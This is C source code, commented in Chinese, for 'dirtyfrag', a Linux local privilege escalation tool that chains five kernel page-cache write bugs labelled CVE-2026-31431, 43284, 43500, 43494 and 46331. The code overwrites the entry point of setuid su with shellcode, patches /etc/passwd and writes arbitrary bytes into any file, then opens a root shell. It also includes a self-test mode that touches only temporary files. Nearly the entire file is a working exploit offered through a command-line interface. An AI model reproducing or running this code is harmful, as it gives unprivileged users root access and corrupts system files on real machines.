    for (i = 0; i < ehdr.e_phnum; i++) {
        off_t at = ehdr.e_phoff + (off_t)i * ehdr.e_phentsize;

        if (pread(fd, &phdr, sizeof(phdr), at) != (ssize_t)sizeof(phdr))
            return -1;
        if (phdr.p_type == PT_LOAD && (phdr.p_flags & PF_X) &&
            ehdr.e_entry >= phdr.p_vaddr &&
            ehdr.e_entry < phdr.p_vaddr + phdr.p_filesz)
            return (long)(ehdr.e_entry - phdr.p_vaddr + phdr.p_offset);
    }
    return -1;
}

/* 通用写: 按 4 字节槽做读-改-写, 每次最多 36 字节 */
static int pd_write_range(int fd, off_t off, const uint8_t *data, size_t len)
{
    size_t done = 0;

    while (done < len) {
        off_t cur = off + (off_t)done;
        off_t slot = cur & ~(off_t)(PEDIT_SLOT - 1);
        size_t shift = (size_t)(cur - slot);
        size_t n = len - done;
        size_t room = (size_t)PEDIT_MAX_WRITE - shift;
        size_t padded;
        uint8_t blk[PEDIT_MAX_WRITE];

        if (n > room)
            n = room;
        padded = (shift + n + PEDIT_SLOT - 1) & ~(size_t)(PEDIT_SLOT - 1);
        memset(blk, 0, sizeof(blk));
        if (pread(fd, blk, padded, slot) < 0)
            memset(blk, 0, sizeof(blk));
        memcpy(blk + shift, data + done, n);
        if (pd_write_fd(fd, slot, blk, padded)) {
            WARN("pedit 写入失败 @0x%llx (%zu 字节)",
                 (unsigned long long)slot, padded);
            return -1;
        }
        done += n;
    }
    return 0;
}

/* userns + netns: 拿到本 netns 的 CAP_NET_ADMIN */
static int pd_enter_ns(void)
{
	char line[64];
	uid_t uid = getuid();
	gid_t gid = getgid();

	if (unshare(CLONE_NEWUSER | CLONE_NEWNET)) {
		perror("unshare(NEWUSER|NEWNET)");
		return -1;
	}
	write_proc_str("/proc/self/setgroups", "deny");
	snprintf(line, sizeof(line), "0 %u 1", (unsigned)uid);
	write_proc_str("/proc/self/uid_map", line);
	snprintf(line, sizeof(line), "0 %u 1", (unsigned)gid);
	write_proc_str("/proc/self/gid_map", line);
	return 0;
}

/* -to/-set: 子进程进 userns 装过滤器写, 父进程读回校验 */
static int pd_generic_write(const char *path, const uint8_t *data,
			    size_t len, off_t base)
{
	int fd, pfd[2], st;
	pid_t c;
	char ack = 0;
	uint8_t *chk;

	fd = open(path, O_RDONLY);
	if (fd < 0) {
		WARN("打开 %s 失败: %s", path, strerror(errno));
		return -1;
	}
	if (pipe(pfd)) {
		WARN("pipe 失败: %s", strerror(errno));
		close(fd);
		return -1;
	}
	c = fork();
	if (c < 0) {
		WARN("fork 失败: %s", strerror(errno));
		close(pfd[0]);
		close(pfd[1]);
		close(fd);
		return -1;
	}
	if (c == 0) {
		close(pfd[0]);
		if (pd_enter_ns())
			_exit(2);
		if (pd_setup()) {
			WARN("pedit 原语初始化失败 (netns 内 CAP_NET_ADMIN / clsact?)");
			_exit(3);
		}
		if (pd_write_range(fd, base, data, len))
			_exit(4);
		if (write(pfd[1], "1", 1) != 1)
			_exit(5);
		_exit(0);
	}
	close(pfd[1]);
	if (read(pfd[0], &ack, 1) != 1)
		ack = 0;
	close(pfd[0]);
	waitpid(c, &st, 0);

	if (ack != '1' || !WIFEXITED(st) || WEXITSTATUS(st) != 0) {
		int ec = WIFEXITED(st) ? WEXITSTATUS(st) : -1;

		WARN("pedit 通用写失败 (子进程 status=0x%x)", st);
		close(fd);
		/* 2=userns 失败, 3=原语初始化失败: 属于环境不可用, 不是写不进去 */
		return (ec == 2 || ec == 3) ? -3 : -1;
	}

	chk = malloc(len ? len : 1);
	if (!chk) {
		close(fd);
		return -1;
	}
	if (pread(fd, chk, len, base) != (ssize_t)len ||
	    memcmp(chk, data, len) != 0) {
		WARN("校验失败: 页缓存内容与 payload 不一致");
		free(chk);
		close(fd);
		return -1;
	}
	free(chk);
	close(fd);
	LOG("校验通过: 页缓存内容与 payload 一致");
	return 0;
}

/* 子进程: 进 userns/netns -> 装过滤器 -> 按槽覆盖 entry */
static int pd_corrupt_entry(int fd, long entry_off)
{
    size_t done = 0;

    if (pd_enter_ns())
        return -1;
    if (pd_setup()) {
        WARN("pedit 原语初始化失败 (netns 内 CAP_NET_ADMIN / clsact 不可用?)");
        return -1;
    }
    while (done < sizeof(pd_shellcode)) {
        size_t chunk = sizeof(pd_shellcode) - done;

        if (chunk > PEDIT_MAX_WRITE)
            chunk = PEDIT_MAX_WRITE;
        if (pd_write_fd(fd, entry_off + (long)done,
                        pd_shellcode + done, chunk)) {
            WARN("shellcode 写入失败 @0x%lx",
                 entry_off + (long)done);
            return -1;
        }
        done += chunk;
    }
    return 0;
}

/* -start 入口: 覆盖 su 的 e_entry, 然后 exec 它拿 root */
static int pd_lpe_main(const char *target, int no_backup, int no_exec)
{
    const char *su_path = pd_find_su(target);
    char bak[PATH_MAX] = "";
    int sync_pipe[2];
    long entry_off;
    int fd, status;
    pid_t child;
    char ack = 0;

    if (!su_path) {
        WARN("没有找到 setuid-root 的 su, 可用 -t <文件> 指定");
        return 1;
    }
    fd = open(su_path, O_RDONLY);
    if (fd < 0) {
        WARN("打开 %s 失败: %s", su_path, strerror(errno));
        return 1;
    }
    entry_off = pd_entry_offset(fd);
    if (entry_off < 0) {
        WARN("%s 不是可解析的 ELF64, 找不到入口偏移", su_path);
        close(fd);
        return 1;
    }
    LOG("目标 %s, 入口偏移 0x%lx, shellcode %zu 字节 (每次最多 %d)",
        su_path, entry_off, sizeof(pd_shellcode), PEDIT_MAX_WRITE);

    if (!no_backup) {
        if (backup_file(su_path, bak, sizeof(bak)) == 0)
            LOG("已备份 %s -> %s", su_path, bak);
        else
            WARN("备份 %s 失败: %s", su_path, strerror(errno));
    }

    if (pipe(sync_pipe)) {
        WARN("pipe 失败: %s", strerror(errno));
        close(fd);
        return 1;
    }
    child = fork();
    if (child < 0) {
        WARN("fork 失败: %s", strerror(errno));
        close(fd);
        return 1;
    }
    if (child == 0) {
        close(sync_pipe[0]);
        if (pd_corrupt_entry(fd, entry_off))
            _exit(1);
        if (write(sync_pipe[1], "1", 1) != 1)
            _exit(1);
        _exit(0);
    }
    close(sync_pipe[1]);
    if (read(sync_pipe[0], &ack, 1) != 1)
        ack = 0;
    close(sync_pipe[0]);
    waitpid(child, &status, 0);
    close(fd);

    if (ack != '1' || !WIFEXITED(status) || WEXITSTATUS(status) != 0) {
        WARN("页缓存改写失败, 目标未被执行");
        if (bak[0])
            pmsg("[*] 备份: %s\n", bak);
        return 1;
    }
    LOG("su 入口已覆盖 (%zu 字节 shellcode)", sizeof(pd_shellcode));

    if (no_exec) {
        LOG("通用写完成, 按 -to/-set 语义不执行目标");
        return 0;
    }

    LOG("执行 %s -> root shell", su_path);
    if (bak[0])
        pmsg("[*] 恢复: cp %s %s\n", bak, su_path);
    execl(su_path, su_path, (char *)NULL);
    perror("execl");
    return 1;
}

/* 按链编号打印对应帮助; mode=0 打通用帮助 */
static void help_for_mode(int mode, const char *prog)
{
	if (mode == CHAIN_ESP)
		help_esp(prog);
	else if (mode == CHAIN_RXRPC)
		help_rxrpc(prog);
	else if (mode == CHAIN_COPY)
		help_copy(prog);
	else if (mode == CHAIN_UAF)
		help_uaf(prog);
	else if (mode == CHAIN_PEDIT)
		help_pedit(prog);
	else
		help_general(prog);
}

/* =====================================================================
 * -test: 每条链的写原语自测
 *
 * 只写自己创建的临时文件, 不碰 /etc/passwd, 不碰 /usr/bin/su,
 * 不 exec 任何 setuid 程序, 不打印 shell。回答一个问题:
 *   "这条链的写原语, 在本机到底能不能把页缓存改掉?"
 *
 * 返回码:
 *   0  通过      页缓存确实被改写, 读回一致
 *   1  未通过    原语跑了, 但页缓存没被改到
 *   3  本机不可用 (缺算法/模块/内核能力), 未做任何写入
 * ===================================================================== */
#define DFT_PAGE 4096

/* 当前临时文件路径: 被 Ctrl-C / 中断时也要删掉, 不留残骸 */
static char g_dft_path[PATH_MAX];

static void dft_cleanup(void)
{
	if (g_dft_path[0]) {
		unlink(g_dft_path);
		g_dft_path[0] = 0;
	}
}

static void dft_sig(int sig)
{
	dft_cleanup();
	signal(sig, SIG_DFL);
	raise(sig);
}

/* 选一个非 tmpfs 的目录: tmpfs 的页语义和块设备文件不同, 测不出真实效果 */
static const char *dft_dir(void)
{
	static char chosen[PATH_MAX];
	const char *cands[5];
	const char *e = getenv("DFTEST_DIR");
	int i, n = 0;

	if (e && *e)
		cands[n++] = e;
	cands[n++] = "/var/tmp";
	cands[n++] = "/tmp";
	cands[n++] = ".";
	cands[n] = NULL;

	for (i = 0; cands[i]; i++) {
		struct statfs sf;

		if (!cands[i] || !*cands[i])
			continue;
		if (access(cands[i], W_OK) != 0)
			continue;
		/* TMPFS_MAGIC = 0x01021994 */
		if (statfs(cands[i], &sf) == 0 && (unsigned)sf.f_type == 0x01021994)
			continue;
		snprintf(chosen, sizeof(chosen), "%s", cands[i]);
		return chosen;
	}
	snprintf(chosen, sizeof(chosen), "/tmp");
	return chosen;
}

/* 造临时文件: init 内容 + 'A' 填到 total 字节 */
static int dft_make_file(char *path, size_t pathsz, const void *init,
			 size_t initlen, size_t total)
{
	uint8_t buf[DFT_PAGE];
	int fd;

	if (total == 0 || total > sizeof(buf))
		total = sizeof(buf);
	if (initlen > total)
		initlen = total;

	snprintf(path, pathsz, "%s/.dftest_XXXXXX", dft_dir());
	fd = mkstemp(path);
	if (fd < 0) {
		WARN("创建临时文件失败: %s", strerror(errno));
		return -1;
	}
	snprintf(g_dft_path, sizeof(g_dft_path), "%s", path);
	memset(buf, 'A', sizeof(buf));
	if (init && initlen)
		memcpy(buf, init, initlen);
	if (write(fd, buf, total) != (ssize_t)total) {
		WARN("写临时文件失败: %s", strerror(errno));
		close(fd);
		unlink(path);
		return -1;
	}
	close(fd);
	return 0;
}

static int dft_check(const char *path, const uint8_t *want, size_t len, off_t off)
{
	uint8_t got[256];
	int fd, ok;

	if (len > sizeof(got))
		return 0;
	fd = open(path, O_RDONLY);
	if (fd < 0)
		return 0;
	ok = (pread(fd, got, len, off) == (ssize_t)len) &&
	     memcmp(got, want, len) == 0;
	close(fd);
	return ok;
}

/* --- 31431: AF_ALG/AEAD, 每次 4 字节 --- */
static int dft_copy(void)
{
	static const uint8_t pat[8] = { 'D','F','3','1','4','3','1','!' };
	char path[PATH_MAX];
	int rc;

	if (dft_make_file(path, sizeof(path), NULL, 0, 64) < 0)
		return 2;
	LOG("CVE-2026-31431 自测: 目标 %s, 写 8 字节", path);
	rc = copy_write_file(path, pat, sizeof(pat), 0);
	if (rc == -2) {
		WARN("内核没有 authencesn / algif_aead, 本机不可用");
		unlink(path);
		return 3;
	}
	rc = dft_check(path, pat, sizeof(pat), 0) ? 0 : 1;
	if (rc == 0)
		LOG("通过: 8 字节已写进页缓存并读回一致");
	else
		WARN("未通过: AF_ALG 调用返回了, 但页缓存内容没变");
	unlink(path);
	return rc;
}

/* --- 43284: XFRM/ESP, 每次 4 字节 --- */
static int dft_esp(void)
{
	static const uint8_t pat[8] = { 'D','F','4','3','2','8','4','!' };
	char path[PATH_MAX];
	pid_t c;
	int st, ok = 0, rc;

	if (dft_make_file(path, sizeof(path), NULL, 0, DFT_PAGE) < 0)
		return 2;
	LOG("CVE-2026-43284 自测: 目标 %s, 写 8 字节", path);

	c = fork();
	if (c < 0) {
		unlink(path);
		return 2;
	}
	if (c == 0) {
		int r = df_generic_write(path, pat, sizeof(pat), 0);

		_exit(r == 0 ? 0 : (r == -3 ? 3 : 2));
	}
	if (waitpid(c, &st, 0) < 0 || !WIFEXITED(st)) {
		WARN("写入子进程异常 (status=0x%x)", st);
		unlink(path);
		return 2;
	}
	switch (WEXITSTATUS(st)) {
	case 0:
		ok = dft_check(path, pat, sizeof(pat), 0);
		rc = ok ? 0 : 1;
		break;
	case 1:
		WARN("unshare(userns|netns) 不可用, 本机不可用");
		rc = 3;
		break;
	case 3:
		WARN("注册 XFRM SA 失败 (缺 CAP_NET_ADMIN 或 XFRM 被禁), 本机不可用");
		rc = 3;
		break;
	default:
		WARN("ESP 写入了但页缓存没变");
		rc = 1;
		break;
	}
	if (rc == 0)
		LOG("通过: 8 字节已写进页缓存并读回一致");
	unlink(path);
	return rc;
}

/* --- 43500: RxRPC/RXKAD, 完整跑一遍三次叠加写 --- */
static int dft_rxrpc_full(void)
{
	uint8_t Ca[8], Cb[8], Cc[8], Cb_a[8], Cc_a[8];
	uint8_t Ka[8], Pa[8], Kb[8], Pb[8], Kc[8], Pc[8];
	uint64_t max_iters = 10000000000ULL;
	const char *e;
	char path[PATH_MAX];
	uint8_t line[32];
	int fd, s, ok = 0, rc = 1;

	s = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
	if (s < 0) {
		WARN("socket(AF_RXRPC) 失败 (%s), 本机不可用", strerror(errno));
		return 3;
	}
	close(s);

	if (dft_make_file(path, sizeof(path),
			  "root:x:0:0:root:/root:/bin/bash\n", 32, DFT_PAGE) < 0)
		return 2;
	LOG("CVE-2026-43500 自测: 目标 %s (用假的 passwd 首行), 不碰 /etc/passwd", path);

	fd = open(path, O_RDWR);
	if (fd < 0) {
		unlink(path);
		return 2;
	}
	if (pread(fd, Ca, 8, 4) != 8 || pread(fd, Cb, 8, 6) != 8 ||
	    pread(fd, Cc, 8, 8) != 8) {
		WARN("读取临时文件失败: %s", strerror(errno));
		close(fd);
		unlink(path);
		return 2;
	}

	e = getenv("LPE_MAX_ITERS");
	if (e)
		max_iters = strtoull(e, NULL, 0);

	LOG("开始搜索三组 fcrypt 会话密钥 (与真实利用同一算法)");
	fcrypt_init_sboxes();
	if (find_K_offline_generic(Ca, max_iters, fc_check_pa_nullok,
				   Ka, Pa, 0x1111ULL, "K_A") != 0)
		goto out;
	memcpy(Cb_a, Pa + 2, 6);
	memcpy(Cb_a + 6, Cb + 6, 2);
	if (find_K_offline_generic(Cb_a, max_iters, fc_check_pb_nullok,
				   Kb, Pb, 0x2222ULL, "K_B") != 0)
		goto out;
	memcpy(Cc_a, Pb + 2, 6);
	memcpy(Cc_a + 6, Cc + 6, 2);
	if (find_K_offline_generic(Cc_a, max_iters, fc_check_pc_nullok,
				   Kc, Pc, 0x3333ULL, "K_C") != 0)
		goto out;

	LOG("三次内核触发 (每次 8 字节 pcbc/fcrypt 原地解密)");
	memcpy(SESSION_KEY, Ka, 8);
	if (do_one_trigger(fd, 4, 8) < 0) {
		WARN("触发 A 失败");
		goto out;
	}
	memcpy(SESSION_KEY, Kb, 8);
	if (do_one_trigger(fd, 6, 8) < 0) {
		WARN("触发 B 失败");
		goto out;
	}
	memcpy(SESSION_KEY, Kc, 8);
	if (do_one_trigger(fd, 8, 8) < 0) {
		WARN("触发 C 失败");
		goto out;
	}

	if (pread(fd, line, sizeof(line), 0) != (ssize_t)sizeof(line)) {
		WARN("回读失败: %s", strerror(errno));
		goto out;
	}
	ok = (line[4] == ':' && line[5] == ':' && line[6] == '0' &&
	      line[7] == ':' && line[8] == '0' && line[9] == ':' &&
	      line[15] == ':');
	if (ok)
		LOG("通过: 三次写都落到页缓存, 首行已变成 root::0:0...");
	else
		WARN("未通过: 触发完成, 但临时文件首行布局不符 —— 原语没写进页缓存");
	rc = ok ? 0 : 1;

out:
	close(fd);
	unlink(path);
	return rc;
}

/* --- 43500 冒烟: 只确认三条前置链路通, 不跑暴力搜索 --- */
static int dft_rxrpc_smoke(void)
{
	long k;
	int s, a;

	s = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
	if (s < 0) {
		WARN("socket(AF_RXRPC) 失败 (%s), 本机不可用", strerror(errno));
		return 3;
	}
	close(s);

	k = add_rxrpc_key("dft-smoke");
	if (k < 0) {
		WARN("add_key(rxrpc/rxkad) 失败 (%s), 本机不可用", strerror(errno));
		return 3;
	}
	syscall(SYS_keyctl, 3, k);

	a = alg_open_pcbc_fcrypt(SESSION_KEY);
	if (a < 0) {
		WARN("pcbc(fcrypt) 打不开 (%s), 本机不可用", strerror(errno));
		return 3;
	}
	close(a);
	LOG("可达: socket(AF_RXRPC) + add_key(rxkad) + pcbc(fcrypt) 全部可用");
	return 0;
}

/* --- 43494: io_uring + RDS, 整页覆盖 --- */
static int dft_uaf(void)
{
	uint8_t page[DFT_PAGE];
	char path[PATH_MAX];
	int rc;

	memset(page, 'A', sizeof(page));
	memcpy(page, "DF43494-page-write", 18);
	if (dft_make_file(path, sizeof(path), NULL, 0, DFT_PAGE) < 0)
		return 2;
	LOG("CVE-2026-43494 自测: 整页覆盖 %s", path);

	rc = uaf_lpe_main(path, 0, page, sizeof(page), 1 /*nobackup*/,
			  1 /*noexec*/);
	unlink(path);
	if (rc == 0) {
		LOG("通过: 4096 字节整页替换成功");
		return 0;
	}
	if (rc == 2 || rc == 3)
		return 3;
	return 1;
}

/* --- 46331: act_pedit, 每次 36 字节 --- */
static int dft_pedit(void)
{
	static const uint8_t pat[16] = {
		'D','F','4','6','3','3','1','-','p','e','d','i','t','!','!','!'
	};
	char path[PATH_MAX];
	int rc;

	if (dft_make_file(path, sizeof(path), NULL, 0, 128) < 0)
		return 2;
	LOG("CVE-2026-46331 自测: 目标 %s, 写 16 字节", path);

	rc = pd_generic_write(path, pat, sizeof(pat), 0);
	unlink(path);
	if (rc == 0) {
		LOG("通过: 16 字节已写进页缓存并读回一致");
		return 0;
	}
	return rc == -3 ? 3 : 1;
}

static int run_test(int mode)
{
	static const struct {
		const char *name;
		int (*fn)(void);
	} list[] = {
		{ "CVE-2026-31431  AF_ALG/AEAD", dft_copy },
		{ "CVE-2026-43284  XFRM/ESP", dft_esp },
		{ "CVE-2026-43500  RxRPC/RXKAD (冒烟)", dft_rxrpc_smoke },
		{ "CVE-2026-43494  io_uring/RDS", dft_uaf },
		{ "CVE-2026-46331  act_pedit", dft_pedit },
	};
	int i, bad = 0;

	atexit(dft_cleanup);
	signal(SIGINT, dft_sig);
	signal(SIGTERM, dft_sig);
	signal(SIGHUP, dft_sig);
	signal(SIGPIPE, SIG_IGN);   /* 输出被 head 截断时也要跑完清理 */

	if (mode == CHAIN_COPY)
		return dft_copy();
	if (mode == CHAIN_ESP)
		return dft_esp();
	if (mode == CHAIN_RXRPC)
		return dft_rxrpc_full();
	if (mode == CHAIN_UAF)
		return dft_uaf();
	if (mode == CHAIN_PEDIT)
		return dft_pedit();

	pmsg("\n[*] 五条链自测: 只写自己创建的临时文件, 不触碰任何系统文件\n");
	pmsg("[*] 目标目录: %s (优先非 tmpfs, 贴近真实攻击面)\n\n", dft_dir());
	for (i = 0; i < (int)(sizeof(list) / sizeof(list[0])); i++) {
		int r;

		pmsg("--- %s ---\n", list[i].name);
		r = list[i].fn();
		if (r == 0)
			pmsg("[=] %s : 通过\n\n", list[i].name);
		else if (r == 3)
			pmsg("[=] %s : 本机不可用\n\n", list[i].name);
		else {
			pmsg("[=] %s : 未通过\n\n", list[i].name);
			bad = 1;
		}
	}
	if (!bad)
		pmsg("[*] 自测结束: 没有\"跑通却没改到页缓存\"的链\n");
	else
		pmsg("[!] 自测结束: 有链跑了却没改到页缓存, 见上面日志\n");
	pmsg("[*] 单条完整测试: ./poc -2026-XXXXX -test"
	     " (rxrpc 的完整测试只能这样跑)\n");
	return bad;
}

int main(int argc, char **argv)
{
	int verbose = (getenv("DIRTYFRAG_VERBOSE") != NULL);
	int mode = 0;            /* 0=未指定, CHAIN_ESP, CHAIN_RXRPC */
	int start = 0;           /* -start: 真正执行, 否则只打印帮助 */
	int check_mode = 0, find_mode = 0, test_mode = 0;
	int no_backup = 0;
	char bak_passwd[PATH_MAX] = "", bak_su[PATH_MAX] = "";
	int have_bak_passwd = 0, have_bak_su = 0;
	const char *to = NULL, *setfile = NULL;
	off_t base_off = 0;
	int rc = 1;
	int new_argc;
	char **co_argv;

	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "-2026-43284") ||
		    !strcmp(argv[i], "--esp") ||
		    !strcmp(argv[i], "--force-esp"))
			mode = CHAIN_ESP;
		else if (!strcmp(argv[i], "-2026-43500") ||
			 !strcmp(argv[i], "--rxrpc") ||
			 !strcmp(argv[i], "--force-rxrpc"))
			mode = CHAIN_RXRPC;
		else if (!strcmp(argv[i], "-2026-31431") ||
			 !strcmp(argv[i], "--copyfail") ||
			 !strcmp(argv[i], "--alg"))
			mode = CHAIN_COPY;
		else if (!strcmp(argv[i], "-2026-46331") ||
			 !strcmp(argv[i], "-pedit") ||
			 !strcmp(argv[i], "--pedit"))
			mode = CHAIN_PEDIT;
		else if (!strcmp(argv[i], "-2026-43494") ||
			 !strcmp(argv[i], "-uring") ||
			 !strcmp(argv[i], "--uring") ||
			 !strcmp(argv[i], "--rds") ||
			 !strcmp(argv[i], "--uaf"))
			mode = CHAIN_UAF;
		else if (!strcmp(argv[i], "-start"))
			start = 1;
		else if (!strcmp(argv[i], "-v") ||
			 !strcmp(argv[i], "--verbose"))
			verbose = 1;
		else if (!strcmp(argv[i], "-check"))
			check_mode = 1;
		else if (!strcmp(argv[i], "-find"))
			find_mode = 1;
		else if (!strcmp(argv[i], "-test") || !strcmp(argv[i], "--test"))
			test_mode = 1;
		else if (!strcmp(argv[i], "-nobackup"))
			no_backup = 1;
		else if (!strcmp(argv[i], "-to") && i + 1 < argc)
			to = argv[++i];
		else if (!strcmp(argv[i], "-set") && i + 1 < argc)
			setfile = argv[++i];
		else if (!strcmp(argv[i], "-offset") && i + 1 < argc)
			base_off = (off_t)strtoll(argv[++i], NULL, 0);
		else if ((!strcmp(argv[i], "-t") ||
				!strcmp(argv[i], "--target")) && i + 1 < argc)
			setenv("POC_TARGET_FILE", argv[++i], 1);
		else if (!strcmp(argv[i], "--corrupt-only"))
			;   /* 由下游 rxrpc_lpe_main / su_lpe_main 处理 */
		else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) {
			help_for_mode(mode, argv[0]);
			return 0;
		} else {
			fprintf(stderr, "[!] 未知参数: %s\n\n", argv[i]);
			help_general(argv[0]);
			return 2;
		}
	}

	/* 默认也输出关键日志(LOG/WARN); -v 额外输出 SLOG/DBG/搜索进度 */
	g_verbose = verbose;

	if (find_mode)
		return scan_setuid_files();

	if (check_mode) {
		g_cfg_chain = mode;   /* 0=全部链都查 */
		return kernel_config_check();
	}

	if (test_mode) {
		if (getuid() == 0)
			pmsg("[!] 当前 uid=0, 自测结果说明不了非特权用户能否利用\n\n");
		return run_test(mode);
	}

	/* -to / -set 必须配对, 否则静默只打帮助会让人困惑 */
	if (to && !setfile) {
		fprintf(stderr, "[!] -to 需要配合 -set <内容文件>\n\n");
		help_for_mode(mode, argv[0]);
		return 2;
	}
	if (setfile && !to) {
		fprintf(stderr, "[!] -set 需要配合 -to <目标文件>\n\n");
		help_for_mode(mode, argv[0]);
		return 2;
	}

	/* -to + -set 属于 ESP 链; 未指定编号时自动按 43284 处理 */
	if (to && setfile && mode == 0)
		mode = CHAIN_ESP;

	if (mode == 0) {
		help_general(argv[0]);
		return 0;
	}

	/* 只给编号、既没有 -start 也没有 -to/-set: 只打印该链帮助 */
	if (!start && !(to && setfile)) {
		help_for_mode(mode, argv[0]);
		return 0;
	}

	if (getuid() == 0) {
		execlp("/bin/bash", "bash", (char *)NULL);
		_exit(1);
	}

	/* -to + -set: 走 ESP / Copy Fail 通用写 (任意文件 + 任意内容 + 偏移) */
	if (to && setfile) {
		uint8_t *pdata = NULL;
		size_t plen = 0;
		pid_t c;
		int st = 0, vr;

		/* pedit 链: 4 字节槽读-改-写, 天然支持任意偏移 */
		if (mode == CHAIN_PEDIT) {
			uint8_t *pdata = NULL;
			size_t plen = 0;
			int prc;

			if (df_load_payload(setfile, &pdata, &plen) < 0)
				return 1;
			LOG("通用写 (pedit): target=%s payload=%zu 字节 offset=0x%llx",
			    to, plen, (unsigned long long)base_off);
			prc = pd_generic_write(to, pdata, plen, base_off);
			free(pdata);
			return prc == 0 ? 0 : 1;
		}

		/* io_uring/RDS 链: 整页替换, 保留未被 payload 覆盖的尾部字节 */
		if (mode == CHAIN_UAF) {
			uint8_t *pdata = NULL;
			size_t plen = 0;
			uint8_t page[4096];
			ssize_t got;
			int fd, urc;

			if (base_off % 4096) {
				WARN("该链只能整页操作, -offset 需按 4096 对齐");
				return 2;
			}
			if (df_load_payload(setfile, &pdata, &plen) < 0)
				return 1;
			if (plen > sizeof(page)) {
				WARN("payload %zu 字节超过一页 (4096), 该链不支持", plen);
				free(pdata);
				return 2;
			}
			memset(page, 0, sizeof(page));
			fd = open(to, O_RDONLY);
			if (fd >= 0) {
				got = pread(fd, page, sizeof(page), base_off);
				close(fd);
				if (got < 0)
					memset(page, 0, sizeof(page));
			}
			memcpy(page, pdata, plen);
			LOG("通用写 (io_uring/RDS 整页): target=%s payload=%zu 字节"
			    " offset=0x%llx", to, plen, (unsigned long long)base_off);
			urc = uaf_lpe_main(to, base_off, page, sizeof(page),
					   no_backup, 1);
			free(pdata);
			return urc;
		}

		/* rxrpc 链的写原语固定在 /etc/passwd 首行, 不支持任意偏移覆盖 */
		if (mode == CHAIN_RXRPC) {
			WARN("CVE-2026-43500 (rxrpc) 不支持 -to/-set 通用写");
			WARN("  它的写位置固定在 /etc/passwd 首行, 请改用 -t <文件>");
			WARN("  需要任意偏移写请用 -2026-43284 或 -2026-31431");
			return 2;
		}

		if (df_load_payload(setfile, &pdata, &plen) < 0)
			return 1;
		/* Copy Fail 链: 直接 AF_ALG 写, 不需要 userns / 不需要 fork */
		if (mode == CHAIN_COPY) {
			LOG("通用写 (Copy Fail/AF_ALG): target=%s payload=%zu 字节"
			    " offset=0x%llx", to, plen, (unsigned long long)base_off);
			vr = copy_write_file(to, pdata, plen, base_off);
			if (vr == -2) {
				WARN("CVE-2026-31431 不可用: 内核没有 authencesn /"
				     " algif_aead, 未做任何修改");
				free(pdata);
				return 3;
			}
			if (vr == 0)
				vr = df_verify(to, pdata, plen, base_off);
			free(pdata);
			return vr == 0 ? 0 : 1;
		}
		LOG("通用写: target=%s payload=%zu 字节 offset=0x%llx",
		    to, plen, (unsigned long long)base_off);
		c = fork();
		if (c < 0) {
			free(pdata);
			return 1;
		}
		if (c == 0) {
			int r = df_generic_write(to, pdata, plen, base_off);

			_exit(r == 0 ? 0 : 2);
		}
		if (waitpid(c, &st, 0) < 0 || !WIFEXITED(st) ||
		    WEXITSTATUS(st) != 0) {
			WARN("通用写子进程失败 (status=0x%x)", st);
			free(pdata);
			return 1;
		}
		vr = df_verify(to, pdata, plen, base_off);
		free(pdata);
		return vr == 0 ? 0 : 1;
	}

	co_argv = append_corrupt_only(argc, argv, &new_argc);

	/* 默认也输出关键日志(LOG/WARN); -v 额外输出 SLOG/DBG/搜索进度 */
	g_verbose = verbose;

	if (mode == CHAIN_UAF) {
		const char *tf = getenv("POC_TARGET_FILE");

		return uaf_lpe_main(tf, 0, NULL, 0, no_backup, 0);
	}

	if (mode == CHAIN_PEDIT)
		return pd_lpe_main(getenv("POC_TARGET_FILE"), no_backup, 0);

	/* 写入前备份目标; 失败/未提权时尝试恢复 (仅 euid=0 时能真正写回) */
	if (!no_backup) {
		if (mode == CHAIN_RXRPC) {
			const char *tf = getenv("POC_TARGET_FILE");
			if (!tf || !*tf) tf = "/etc/passwd";
			if (backup_file(tf, bak_passwd, sizeof(bak_passwd)) == 0) {
				have_bak_passwd = 1;
				LOG("已备份 %s -> %s", tf, bak_passwd);
			} else {
				WARN("备份 %s 失败: %s", tf, strerror(errno));
			}
		} else {
			if (backup_file("/usr/bin/su", bak_su, sizeof(bak_su)) == 0) {
				have_bak_su = 1;
				LOG("已备份 /usr/bin/su -> %s", bak_su);
			}
		}
	}

	if (mode == CHAIN_RXRPC) {
		rc = rxrpc_lpe_main(new_argc, co_argv);
		for (int i = 0; !passwd_already_patched() && i < 3; i++)
			rc = rxrpc_lpe_main(new_argc, co_argv);
	} else if (mode == CHAIN_COPY) {
		const char *tf = getenv("POC_TARGET_FILE");

		if (!tf || !*tf) tf = "/usr/bin/su";
		rc = copyfail_run(tf);
	} else {
		rc = su_lpe_main(new_argc, co_argv);
	}

	if (rc == -2) {
		WARN("CVE-2026-31431 不可用: 内核没有 authencesn / algif_aead, 未做任何修改");
		/* 没有发生任何写入, 备份没有意义, 删掉避免在 /tmp 留副本 */
		if (have_bak_passwd)
			unlink(bak_passwd);
		if (have_bak_su)
			unlink(bak_su);
		return 3;
	}

	int patched = either_target_patched();

	if (!patched) {
		const char *tf = getenv("POC_TARGET_FILE");
		if (!tf || !*tf) tf = "/etc/passwd";
		if (geteuid() == 0) {
			if (have_bak_passwd)
				try_restore(bak_passwd, tf);
			if (have_bak_su)
				try_restore(bak_su, "/usr/bin/su");
		} else if (have_bak_passwd || have_bak_su) {
			/* 非 root 无法写回, 只提示备份位置, 不刷屏 */
			pmsg("[*] 未提权, 目标未被修改; 备份留作保险: %s%s%s\n",
			       have_bak_passwd ? bak_passwd : "",
			       (have_bak_passwd && have_bak_su) ? " , " : "",
			       have_bak_su ? bak_su : "");
		}
	}

	if (patched) {
		(void)run_root_pty();
		return 0;
	}

	dprintf(2, "dirtyfrag: failed (rc=%d)\n", rc);
	return rc ? rc : 1;
}
